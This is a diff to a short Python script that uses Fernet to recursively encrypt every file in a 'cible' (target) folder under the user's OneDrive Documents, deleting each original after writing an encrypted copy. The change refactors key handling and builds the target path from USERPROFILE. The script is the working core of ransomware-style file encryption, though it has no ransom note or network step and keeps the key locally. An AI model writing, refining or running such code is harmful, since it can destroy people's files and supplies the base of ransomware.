@@ -1,17 +1,18 @@
 import os
 from cryptography.fernet import Fernet
 
-folder = "C:\\Users\\jorda\\OneDrive\\Documents\\cible"
-
+KEY_FILE = "encrypte.key"
 
 def generate_key():
-    key = Fernet.generate_key()
-    with open("encrypte.key", "wb") as key_file:
-        key_file.write(key)
-    return key
+    if not os.path.exists(KEY_FILE):
+        key = Fernet.generate_key()
+        with open(KEY_FILE, "wb") as key_file:
+            key_file.write(key)
+    else:
+        return
 
 def load_key():
-    return open("encrypte.key", "rb").read()
+    return open(KEY_FILE, "rb").read()
 
 def encrypt_file(file, key):
     with open(file, "rb") as f:
@@ -24,16 +25,17 @@ def encrypt_file(file, key):
         f.write(encrypt_data)
     os.remove(file)
     
-    print(f"File crypted: {file}")
+    print(f"File encrypted: {file}")
     
 def encrypt_all_files(directory, key):
     for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
-            if not file.endswith(".enc") and file != "encrypte.key":
+            if not file.endswith(".enc") and file != KEY_FILE:
                 encrypt_file(file_path, key)
-                print(f"Encrypted {file_path}")
 
 if __name__ == "__main__":
-    key = generate_key()
+    generate_key()
+    key = load_key()
+    folder = os.path.join(os.environ["USERPROFILE"], "OneDrive", "Documents", "cible")
     encrypt_all_files(folder, key)
